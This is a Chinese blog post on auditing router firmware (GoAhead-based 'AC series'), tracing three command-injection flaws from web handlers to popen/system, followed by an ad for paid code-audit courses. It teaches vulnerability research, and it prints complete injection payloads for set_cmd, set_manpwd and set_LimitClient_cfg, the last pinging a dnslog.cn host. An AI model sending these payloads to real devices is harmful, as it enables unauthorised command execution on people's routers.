#  一次二进制RCE漏洞审计  
 进击安全   2026-04-14 03:17  
  
前言：最后一篇库存文章，现在头脑发胀，感觉二进制要学的东西还有很多很多。就这样晚安。  
# 1、下载固件  
  
产品中心下载对应固件即可  
  
我这里选择的是AC系列  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iauwNHkmNabrXQ0PaMu3dUcXHdZQ6icMRN1AWvPiaKIEjNkbYpsQELVZCldqoQckvBbAYFDu1HS3pNd7H27DcicoIZLaRA61GLO15gib17u8ZrN0/640?wx_fmt=png&from=appmsg "")  
  
选择下载该路由器的固件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iauwNHkmNabrGuVXTWBvEiaS5btOroOd6FBAcPT2Yf1DhKDl7uyYCfuhNfwfcPRz2DbuxSgqSxf3Xa2ZPjQWkw61l5y9UiaGKclwrYgsvqSDPs/640?wx_fmt=png&from=appmsg "")  
# 2、提取  
  
一般使用bingwalk提取或者在线网站提取 https://zhiwanyuzhou.com/multiple_analyse/firmware/  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iauwNHkmNabq3hUho2wMibK54KwmzYQjPPSLcrzGJvEHaMFzsIHPnoWiaPdfKmna9IQC9KYe2Jl3Z6Ztp3ic4IVKsrZrgT00m6WoLM6P6JQN2oc/640?wx_fmt=png&from=appmsg "")  
  
下载该固件的源代码  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iauwNHkmNaboiccB5bEmuBUkdqfmMsILnwjckfkALEiazuRiaNRIVnWRiac203OKaBIXNOAHJO9eCU3UeJPticenPelWJq9O489I0V8fwTQvD2tic8/640?wx_fmt=png&from=appmsg "")  
  
# 3、逆向分析  
  
那么一般按照两种办法来分析，第一种是不知道漏洞，从头开始找，另一种是知道poc，想知道这个poc逻辑的。  
## 3.1、NdayPoc  
  
按照网上的爆出来的POC，路径是goform/set_cmd  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iauwNHkmNabrRH876dDblnbw0TysNJibEqxYhpHqu1lYW2ic6QflSYUNuhPPvOmWeDSnFKuBjbdkBNUzhicl9GlzKkld1PcU2jrG0xLHaI2jWhw/640?wx_fmt=png&from=appmsg "")  
  
Mac  
笔记本使用grep  
可以查询goform  
的调用情况  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/iauwNHkmNabpWtKYWYTxxiahIZscTNGjIZIhDnxMYwZGA582xcGSuuJ5WFEBhZHRz85dtVv3OjTrqqo4NmJ1CETo2ic5jDJHZ5f8Vpc7sII0Tk/640?wx_fmt=jpeg&from=appmsg "")  
## 3.2、逆向分析  
  
在 GoAhead Web 服务器中，goform  
 是处理表单提交（POST 请求）的标准路径前缀。那么定位到goahead  
 二进制文件，通过逆向文件，点击View -> Open subviews-> Strings  
，查找关于goform  
关键字符串。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iauwNHkmNabpxddNTxshJvicjTChfTo8ibl9ccNatdH0aAyHMZKDVpglTv0RbiaUwiajwG51yQY5IWw4iax8E6ia4SMnHduQ1W6oichIMbnML4vIeSM/640?wx_fmt=png&from=appmsg "")  
  
.rodata:0047AB54  
在内存中划分的一个特定区域，储存在004717F8  
开头的位置上。我们这只查找/goform  
这个路由  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iauwNHkmNaboLdZ9gmA3o1Ypwh6IFM8ibJT3Upn4b9ibdKaYdBRJ8tHwLVdPIoO9aOf3mIgxSHzJQT8fWNLmpNKibYeXMhReRfRC8hL0FT3UFmU/640?wx_fmt=png&from=appmsg "")  
  
双击main+50C  
进去，查看具体的调用位置  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iauwNHkmNaboicW90nhVrN7hUIpathky3icZoMM03IvyHdYibODrszZXwKn2XTibalLIqoyLqd8VJtOrqGqzR5bQTDI0mcfZQUqdXicxZBZ3GYaibs/640?wx_fmt=png&from=appmsg "")  
  
这种反编译代码有点难阅读，转换为C代码，点击F5  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iauwNHkmNabpaZleEf79BZpJqs6cJ3QCretEia0XqictxaI2RkjJNaHEwiaybKSs8XQRL8hhFuP0v2yEdwomlcrpaXWE0UtTPHow9mOARPQjiaEk/640?wx_fmt=png&from=appmsg "")  
  
定位到websUrlHandlerDefine((int)"/goform", 0, 0, (int)websFormHandler, 0);  
这个websSecurityHandler  
就是路由请求入口，也就是/goform  
和/cgi/bin  
两个  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iauwNHkmNaboib5Wof98WibTFHBYLHs2icNBnQM7k7qg0Sf2v9Ahv848BcXGKKOX5RV3NGJTNlUOJt02R9BLZib4icFTrAfCbbBvpVQbnJWlULfak/640?wx_fmt=png&from=appmsg "")  
  
之后再搜索set_cmd  
，定位到该函数代码，跟上面类似操作  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iauwNHkmNabpKPeWpZQAvqfgUBUgNpGCwl5GVa3MxbShP9FSnLfUZiaDMJPhiaeDdMY55xfvSYPUcUdHBavRiamOHSLjNqiaN2iaHVWqskvO7ia5cI/640?wx_fmt=png&from=appmsg "")  
  
定位到具体代码，发现这里sub_44F18C  
函数只有一个传参a1  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iauwNHkmNabpx3YPACa1aiaXUcAqGIicFnntshovGjpseIl6JFgH312bGXzUu9iaiahO5cptTzwUVibfbXFA51gog7yJWBcJFVZzibfS63myUw6W6Q/640?wx_fmt=png&from=appmsg "")  
  
该代码具体功能为，从当前的 HTTP 请求中获取名为 **cmd**  
 的参数值Var = (const char *)websGetVar(a1, "cmd", "");  
构造Json对象，类似{"type": "setcmd", "cmd": "用户输入的内容"}  
```
Object = cJSON_CreateObject(); String = cJSON_CreateString("setcmd"); cJSON_AddItemToObject(Object, "type", String); v5 = cJSON_CreateString(Var); cJSON_AddItemToObject(Object, "cmd", v5);
```  
  
最终调用函数bs_SetCmd  
执行命令  
```
v6 = cJSON_PrintUnformatted(Object); // 将 JSON 对象转为字符串 memset(v8, 0, 8196); // 清空 8KB 的缓冲区 v8 bs_SetCmd(v6, v8); // 核心：调用底层接口执行命令
```  
## 3.3、外部调用  
  
在二进制文件goahead  
，并未发现该函数的定义，只能通过查找其他二进制文件去寻找该函数定，使用Grep查找bs_SetCmd  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iauwNHkmNaboicPqDDia7MTYYibm1Aua2H28m0NHj8fnswP0z3Lc3u0wgMgKd9wRWZgc8gjL7V7eP94jPXCdykia45jRQicQ66j5ulYfof3nqgWtQ/640?wx_fmt=png&from=appmsg "")  
  
打开libshare-0.0.26.so  
文件，全局搜索bs_SetCmd  
，定位到该函数  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iauwNHkmNabrcUftMnia7nyhfk57KqUGibfLK6e0NHQf3dP20b7ABhavhCVPA1yooz5viaxx9Gst7Fibw5aficp18UwJq9v6fcMBmHyibxsew3MBX0/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iauwNHkmNabr1owyRofHQF2jXiaZDsKHVFUp5aNKKX7FzKLO3cpWlB4jeb5k64DE407AarSBGbKuicC1x1S6AzOyibjBjxRDgLibQrs1DuhfByXs/640?wx_fmt=png&from=appmsg "")  
  
这里先认识popen  
这个函数，简单来说就是个危险的命令执行函数  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iauwNHkmNabo8cvibwwr2RmVu1UEPBo7PJI086WJWkXYx9vG44VoaXPoY6mLleWYRTJxicJIAJkMmbu8rRGHpib46pYY8l4fgIOzvKdSH5pd8Uc/640?wx_fmt=png&from=appmsg "")  
  
再回到这里的代码，只需要关注 **a1、v4、v9、v19、v21、v12**  
 这几个参数。主要的作用  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iauwNHkmNabqeQsgJHk1VzBnTnaSauQT0WW0Ws8jibDDgLNvayOZEemxLKD9DFYJBZIkVlAibngCwZiaWntadHAywx8oDrrqObpJbiawPOmNVDkY/640?wx_fmt=png&from=appmsg "")  
  
将传入的 **a1**  
 值进行解析，并获取 **json**  
 内的键名 **cmd**  
 所对应的参数  
```
v4 = cJSON_Parse(a1); ... v9 = cJSON_GetObjectItem(v4, "cmd");
```  
  
将用户输入的命令内容拷贝到缓冲区 **v19**  
 中，通过 **sprintf**  
 将用户输入拼接到一个预设的命令模板中（存储在 v21  
），调用 **popen**  
 执行拼接后的完整命令，并以只读模式 ("r"  
) 打开管道。  
```
strcpy(v19, *(...)(v9 + 16)); sprintf(v21, (const char *)&off_53B98, v19); v12 = popen(v21, "r");
```  
  
那么现在就很明确了，唯一就是要看 **sub_44F18C**  
 函数怎么被调用，对该函数进行跟踪  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iauwNHkmNabr3MC6u3XOe57jibHt6x7sTb6FXdPI1WrP0qlYDTTL9L0ck3IgibrFw3l216LHib533NNM9Iqsrxm0covNnZbTq1rdpqRuLnn2tw4/640?wx_fmt=png&from=appmsg "")  
  
发现 **web**  
 路径为 **set_cmd**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iauwNHkmNabpWW3FzISfgrZkVMDgzYqClCglKn67Rs7FPricS39BxSc71RshsYF8f0yNKqMFSJw6Rvsk7BQe6a61wph4CQGtzmuPkEzTk4SCI/640?wx_fmt=png&from=appmsg "")  
  
至此整个poc链路就很明确了set_cmd路径  
->sub_44F18C函数  
->bs_SetCmd函数  
->命令执行函数popen  
## 3.4、Payload  
```
POST /goform/set_cmd HTTP/1.1Host: xUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36accept: */*Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Connection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 0cmd=id
```  
# 4、0day挖掘（set_manpwd）  
## 4.1、定位危险函数  
  
上面是已知漏洞跟踪函数，来找到最终触发点 **popen函数**  
 ，那么也可以先找危险函数 **system**  
 等，来逆推找到网页的请求路径。  
  
搜索那个二进制文件调用了 **system函数**  
 ，使用grep -R "system" . 2>/dev/null | sort | uniq -c | sort -nr | head  
，在如下的几个文件中，有几个是无需关心，只需要关心处理 Web 指令的核心函数的libshare-0.0.26.so  
文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iauwNHkmNabqp3PLBnyqG12zCElX7u2iarhoNHy55Mpu6ibj6u2zPvv2JNv8wY3GtiavvFWMw1UiclUF12ibgOvVibibeUWZjp3JmvS1lBeEqAZ0Tjo/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iauwNHkmNabrVZtRBgejs05libSS7jfogAuUc1NOlwOibqsptzKgsgTKDxpaCYh6wKA3PKEkL6LXaxBBybMibY5Gr6ToxpmJHmoU5B6WlymB0Qg/640?wx_fmt=png&from=appmsg "")  
## 4.2、逆向分析  
  
在该文件全局搜索有关system  
的函数，则出现以下函数  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iauwNHkmNabpj2aSkPre1720EgOVoYuYUbia2WNvsTKFjOZvCO9xvydum7fHmrhVob7fa7ty1GicOewvayibyuEwQuUdvphILFL5YMm3kJ4dz18/640?wx_fmt=png&from=appmsg "")  
  
搜索bl_do_system  
函数，查看在那些函数中被调用，点击下面的图标或者按X都可以  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iauwNHkmNabrQRVy82mia6cAKickzUSyzqn9oUd7eSM6xc0HIsFtwlcoRnpicVhE8Q5NcatNDbaN04NYn1m1lq5bDQ70dejBSozvlYNod5UDGHk/640?wx_fmt=png&from=appmsg "")  
  
这里定位到函数bs_SetManPwd  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iauwNHkmNabpVhFN7RniaIly60RgwGbLnBYfLL7De2zVabbOBJGtnuJCSLzHe2mbnCDUst2MNBIWC0NxyBuZrsR9hOwzmOZKVJQULyicZBFHoE/640?wx_fmt=png&from=appmsg "")  
  
这里也只需要看几行代码，将参数a1  
解析为json  
对象，从json中提取键名routeusr  
给v10  
```
v3 = cJSON_Parse(a1); //...v10 = cJSON_GetObjectItem(v3, "routeusr"); //
```  
  
然后将用户输入的命令内容拷贝到缓冲区 v11  
中，并使用函数bl_do_system  
 去执行v11  
传入的参数，并且可控  
```
v11 = *(const char **)(v10 + 16); //bl_do_system("sed -e 's/^%s:/%s:/' /etc/passwd > /etc/newpw", v12, v11);
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iauwNHkmNabpYtKkWcz6QQ8plS1oBFDvNHTwrQX29BqIwjE33O99gxWiaT5OUvVfBb8zZcG2c0L0p68gDArytMFZwlEDD3vzzR0Zpo0NWhDzE/640?wx_fmt=png&from=appmsg "")  
## 4.3、外部调用  
  
既然发现这里的命令执行函数传入参数可控，逆推那个二进制文件调用bs_SetManPwd  
。 全局搜索bs_SetManPwd  
发现goahead  
文件中调用  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iauwNHkmNabr11Nsze7IAzg1mwiaF0d2csTfUIxBuZUVnwxE3w3XMVq3ChIiaFCJmHAaTSN4pJIiboOdkVrFLZF7ia5c0Q4iahhEiaFHNO0F4BktUE/640?wx_fmt=png&from=appmsg "")  
  
寻找到函数bs_SetManPwd  
 也只需要关注几行代码  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iauwNHkmNabp1qFNgaKpSwibpCJC5SUreofCcyDfDPEOwLJY6dW7HMVVGaiabJ8wo5Lpq427HSibfZODYVXsuHWQP9ictpGeNoGuanhySGbsDl3Q/640?wx_fmt=png&from=appmsg "")  
  
从 Web 页面提交的表单中获取名为 **routepwd  
**（路由器密码）的参数值  
```
Var = (const char *)websGetVar(a1, "routepwd", "");
```  
  
将刚才获取的原始字符串 Var  
 转换成一个 JSON 字符串对象  
```
v5 = cJSON_CreateString(Var);
```  
  
将刚才创建的密码对象放入一个名为 Object  
 的 JSON 对象中，键名设为 "routepwd"  
。  
```
cJSON_AddItemToObject(Object, "routepwd", v5);
```  
  
将整个 JSON 对象转化成一串连续的字符串（例如 {"type":"setmanpwd","routepwd":"你的输入"}  
```
v7 = cJSON_PrintUnformatted(Object);
```  
  
最后执行bs_SetManPwd  
函数bs_SetManPwd(v7, v12);  
  
这里只需要关注最后一点，找到该函数的请求路径set_manpwd  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iauwNHkmNaboT0U8bEMzdl3GvDsXBI35LXtxvia5U8IhLibeREYhIeHfwthwXicW5BBxic7DhhfHIdSrQmWOic8ZyRWEJFl5BNK98lkVicSr20hjtY/640?wx_fmt=png&from=appmsg "")  
  
该方法以逆推方式来找到漏洞点，危险函数->从GoAhead.so  
文件寻找Web服务器触发点->函数请求路径  
## 4.3、Payload  
```
POST /goform/set_manpwd HTTP/1.1Host: xUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36accept: */*Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Connection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 0  routepwd=1;ping x;#
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iauwNHkmNabolOibcjVhjPk2Q0vjsETIDeicc0J6HwM93hlRXGbj5JWLdP43g8MicM7aSQGeCqulCSocw9p6sazibS25U2IgiczjicQgz2DkuogASQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iauwNHkmNabrMcBBIFiaibu187RdJIoTZfoNzibl1CiaVTPWgNz9IgNHOcEpuKfwo1vlzepjXAswm6tLg59097yGhMBgp7oDvp8gUyaTGjniazXnQ/640?wx_fmt=png&from=appmsg "")  
# 5、0day挖掘2  
## 5.1、逆向分析  
  
前面写了危险函数，一个一个找就行，现在定位到函数bs_SetLimitCli_info  
，这里也是只需要关注几行代码就行。大概意思从传入的Json  
内容，提取出 mac  
、time1  
、time2  
、setlimitclient  
，但其中time1  
 和 time2  
 必须精准设置为 "00:00-00:00"  
，之后mac  
参数调用bl_do_system  
函数执行命令。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iauwNHkmNabpdWlLCic3pybJjaTpJGn0dTRCAcRMdhiaVrkxgGLiaC4CPVFib6NMhqYcabWwulaJTq4AtlmeLfdXLSwVKZoPR4TMfrWAuY1wApqM/640?wx_fmt=png&from=appmsg "")  
## 5.2、外部调用  
  
发现在goahead.so  
文件被调用  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iauwNHkmNabqh4gKsv80XlbiaHnljeJKfeRZRWCNgL5B61um9WDia5hthyvDZ0Fpe4lmrHDS4BSHBBTmfGXZu1YwqmUBJobf1rMU7kfIs0QsHE/640?wx_fmt=png&from=appmsg "")  
  
查看该函数调用，直接从http  
请求中获取参数直接调用函数执行命令  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iauwNHkmNabq3q78S9NrpQrod8rnAcg4VdopeKnNQfz9JSbsqZROibG3Pn5wOesPn6Gw10BEGucQoWMGUOZKAnr5fmm6Mic01kPh4hiaegq8uqA/640?wx_fmt=png&from=appmsg "")  
  
之后发现set_LimitClient_cfg  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iauwNHkmNabpO67KGicpdAxWypatHibRJ7kBCicd00aQxH53lyvwlWMZZPY8cveKWSQeeGVLvNmH3OB7KJtgSE4002NmF6rFn7YSiasHa5yS8myc/640?wx_fmt=png&from=appmsg "")  
## 5.3、Payload  
```
POST /goform/set_LimitClient_cfg HTTP/1.1Host: xUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36accept: */*Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Connection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 0  type=setlimitclient&time1=00:00-00:00&time2=00:00-00:00&mac=AA:BB:CC:DD:EE:FF;ping x.dnslog.cn;#
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iauwNHkmNabpPz7x35D0FFXh3jXicbqoQUlm1aw4FQzCw8g8jESibaYppib3AvAgnnicFcq1wpw9hdia78899TKUEumHTKYyVo1MHgjrbOlaX4Dcs/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iauwNHkmNabqP083Lky4b2fYj2xeZJrbibVJoIW4iasVPR7tTI6t2uJ2Gn9nzWuJ9IFvmaNrsehQibKibiaibjKqwKSZ5PeuUu8icn6HnsFlFQRCo5k/640?wx_fmt=png&from=appmsg "")  
  
  
**代码审计培训介绍&广告区域**  
  
  
             历经四期培训，终于迎来了代码审计第五期培训，本次培训依旧一次报名一直可听，并且富含前面四期课程均可以听，先来看看之前的培训都有哪些内容，这里我给大家截屏看看。  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_gif/HBLcNkZ8PQddO5DZYzH4GcwlsOwEK5cR1A5XZuWXTP3ib3tWpcAtuLUaliasnZQvBmenGd0UNicFQOsJGyIzodicicg/640?from=appmsg&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=0 "")  
  
一、往期-第四期课程  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/dJGuszYr5iaRGiaZURAxJAROibCh1sjaZictcbC4iasuuOgCMQSDSwrG5Wfrx2QgfvKx8icDhm0gIia8fN6mThehEK8ww/640?from=appmsg&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=1 "")  
  
###       
  
  
###     我们先来看看上一期课程内容，内容如下，给各位师傅们讲解上一期课程讲解了哪些内容，包括相关的学员出货记录，以及部分课件内容。  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/HD0HxvpnwC5ZeImfWYKsmFnrQxS8uec0lgeqCdbhfrzK5af1GicN0VznKVcCJFJwfqDVFIopkWP0OQxia5Y2Fj7g/640?&wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=2 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/vjKYWs9y65W5n4PxYWtJKL6NFQ5b33EDmVhhibZ7XqTbzFP6AKT75NO9ruuOia5WEJlbCukAFpHGbhicHv0elprLg/640?&wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=3 "")  
  
往期-第四期基础课程  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/byR65XibZJfW0aVCxh4yatvn7mHPias6u1M2xpeaYD31jyyrHgz550eWgUu6O2KFmah7jZVsyceicfXzRh2nR2pyA/640?&wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=4 "")  
  
  
  
  
###   
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kRiafv0xWrYNj68yRXDsY2ZFjsoTXY5pkavYIOCUauJwJV4mSv3rjyMeRyHK3GYNiaoshnG5HS0C5typf4YJarObcfw5kBx2nqD4/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=5 "")  
  
此为第四期基础课程，共计授课四十次，此外第四期相较于第三期新增了APP、小程序、WEB逆向，同时主线仍然在代码审计上面，其中基础课程主要目的为：  
  
掌握代码审计思路、完成0-1、能够独立开始审计项目  
。  
  
讲解方向如下：  
  
  
✅ NET代码审计  
✅ APP、小程序、WEB逆向  
  
✅ JAVA代码审计  
  
  
（当然个人认为讲的最好的是JAVA代码审计，而且此次代码审计偏向0-1的实现，更多的是讲解完漏洞原理之后小朋友带着进行实战代码审计，分析各个项目，从理论→实践的演变，当然小朋友们每个课程都是这种方式。）  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/HD0HxvpnwC5ZeImfWYKsmFnrQxS8uec0lgeqCdbhfrzK5af1GicN0VznKVcCJFJwfqDVFIopkWP0OQxia5Y2Fj7g/640?&wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=6 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/vjKYWs9y65W5n4PxYWtJKL6NFQ5b33EDmVhhibZ7XqTbzFP6AKT75NO9ruuOia5WEJlbCukAFpHGbhicHv0elprLg/640?&wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=7 "")  
  
往期-第四期  
进阶课程  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/byR65XibZJfW0aVCxh4yatvn7mHPias6u1M2xpeaYD31jyyrHgz550eWgUu6O2KFmah7jZVsyceicfXzRh2nR2pyA/640?&wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=8 "")  
  
  
  
###   
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kQj7gtRxgXQhsVQrxgJIeMpPefRQaYxUKBScq8bopeoYEwchnxyia6kTOQztZdxSPmCD6JjZSV7ahJJxDmhWv5Ih1ibicnF0D0DQo/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=9 "")  
  
  
    为什么在第四期课程分为了基础课程以及进阶课程，就是因为发现学员大部分都是为了审计而去审计，单一的去使用某一个方法审计漏洞，而不会进行漏洞的组合拳，扩大危害，  
**虽然自己都是实战案例，但是发现学员都是跟着案例当中的漏洞去套用在了自己的源码\项目当中**  
。  
  
所以开启了第四期进阶代码审计课程，课程目的主要为：  
  
  
✅   
深入理解鉴权  
  
✅   
漏洞组合拳扩大危害  
  
✅   
尝试0-1贴合多数学员完成前台RCE出货  
  
  
（本次授课累计20余次，专项针对以上目的，大量分析鉴权&绕过、组合拳利用、前台RCE）  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/HD0HxvpnwC5ZeImfWYKsmFnrQxS8uec0lgeqCdbhfrzK5af1GicN0VznKVcCJFJwfqDVFIopkWP0OQxia5Y2Fj7g/640?&wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=10 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/vjKYWs9y65W5n4PxYWtJKL6NFQ5b33EDmVhhibZ7XqTbzFP6AKT75NO9ruuOia5WEJlbCukAFpHGbhicHv0elprLg/640?&wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=11 "")  
  
往期-第四期-部分学员报喜&课件  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/byR65XibZJfW0aVCxh4yatvn7mHPias6u1M2xpeaYD31jyyrHgz550eWgUu6O2KFmah7jZVsyceicfXzRh2nR2pyA/640?&wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=12 "")  
  
  
  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kTXQDPUKsKHZbT9soF5IvRibWtzOou0ziaicL3uoJFiaL3lWibGbCg2zJH1l6lkgG1mbCf12KkWG6CJbhKFnASZ7jrdYKoZx2ceSp80/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=13 "")  
  
  
  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kQiaMjmHyczb22upCHkCdRrPCWh0ibDibLR90bjo6uC9vMweXBPQ1ISwMVgp6Iicx8GtTqVCl4feWyvFRquQTGl9uc9SlHPQrrjsqw/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=18 "")  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kQzkiaofhFhgS3S8LhJpdApy8EBpqUQ1I0JqpYpN4ibzzia2hpvexh6qqXl6cCb9kNKW8yfJ8WFZEGYSIRS6tCr2a5qXb6j21ajAA/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=20 "")  
  
  
  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/G4zicxKmtXXhicvpUX9R0fxBOic1XNQdlPRrh27zNXQlQ9UYKWLzvZvPYqu3licIgC4v7j1ArN4vfJjoxp4MgTvFmA/640?from=appmsg&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=25 "")  
  
上下滑动查看更多  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Pu52Sn0jPu0EbVUSia7W7sUxTVicmhGmYTkl23iaZv7FdOTQE7bh7lb3gMR7hqLULFpHDq5UyDClYpOMAgnLljB2w/640?from=appmsg&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=26 "")  
  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kSoG2R8pnSkAr31H9NcXBOlCUjHlCuVCTDUesia3SDPL7KWMhezbm5vhlFMRK8CqEryf5bogmmaAtNUJPOAjzV4lFnqgN1mg3eA/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=27 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kRmW22S1pCnchaaTavRvaNXOqDzxMG4BfVpN20aOOwd0tWBoA9chrXBh6tcvnVibvA74GGiaxZytZOug681PfTHicVEXibg0icNPsnw/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=28 "")  
  
  
  
  
  
  
  
  
  
**左右滑动查看更多**  
  
**>**  
  
    那么可能会有师傅提问，为什么没有PHP呢，其实PHP也是有讲解的，只不过大部分是直接的案例，基础的PHP代码审计函数以及基础等，均放在了第三期课程当中。  
  
（部分课件）  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kTF2nCawL72ICcvknrtJ9b04JfGdHHeLI1LAGf76mbpvTrA7qmBrlLnQepGgOaapibIS95bOE316e8BhPq6p1ntkDfMGgXJBLWY/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=45 "")  
  
    这也是为什么有的学员在报名之后，我会给他规划学习路线，先看xxx在看xxx，这些都是小朋友认为哪一期的那些内容讲的不错，然后给兄弟们总结出来的优质学习路线。  
  
那么接下来我们可以看看小朋友在做了四期培训之后  
学员出货报喜时刻：  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/HD0HxvpnwC5ZeImfWYKsmFnrQxS8uec0lgeqCdbhfrzK5af1GicN0VznKVcCJFJwfqDVFIopkWP0OQxia5Y2Fj7g/640?&wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=46 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/vjKYWs9y65W5n4PxYWtJKL6NFQ5b33EDmVhhibZ7XqTbzFP6AKT75NO9ruuOia5WEJlbCukAFpHGbhicHv0elprLg/640?&wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=47 "")  
  
往期-学员报喜时刻（部分）  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/byR65XibZJfW0aVCxh4yatvn7mHPias6u1M2xpeaYD31jyyrHgz550eWgUu6O2KFmah7jZVsyceicfXzRh2nR2pyA/640?&wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=48 "")  
  
  
  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kTWghKPU8RCEUglFN02tZp9tic3cc4Sj6W4g5VIiaGSIIyqWXe1U3jz7vsjEe4TJUMZ7Rw7GZiaiautO737t051OiaWse5yWV61EjN8/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=49 "")  
  
